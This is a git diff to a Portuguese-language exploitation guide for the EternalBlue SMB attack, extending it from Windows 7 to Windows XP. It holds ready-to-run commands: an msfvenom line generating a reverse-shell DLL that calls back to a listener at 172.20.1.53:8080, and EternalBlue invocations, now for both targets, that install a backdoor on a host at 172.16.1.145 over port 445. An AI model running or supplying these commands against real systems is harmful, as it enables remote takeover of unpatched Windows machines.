@@ -6,6 +6,7 @@ Testado em:
 
 - Windows 7 Ultimate 7601 Service Pack 1 (32 bits)
 - Windows 7 Professional 7601 Service Pack 1 (64 bits)
+- Windows XP Professional 2600 Service Pack 2 (32 bits)
 
 #
 
@@ -57,9 +58,16 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.20.1.53 LPORT=8080 -f dll > 
 - Porta que irá receber a conexão reversa: 8080
 <br>
 
-Instalando backdoor no servidor alvo com EternalBlue:
+Instalando backdoor no servidor alvo com EternalBlue (Windows 7):
 ```
 wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
+```
+
+ou
+
+Instalando backdoor no servidor alvo com EternalBlue (Windows XP):
+```
+wine Eternalblue-2.2.0.exe --TargetIp 172.16.1.145 --Target XP --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt
 ```
 - IP do servidor alvo: 172.16.1.145
 <br>
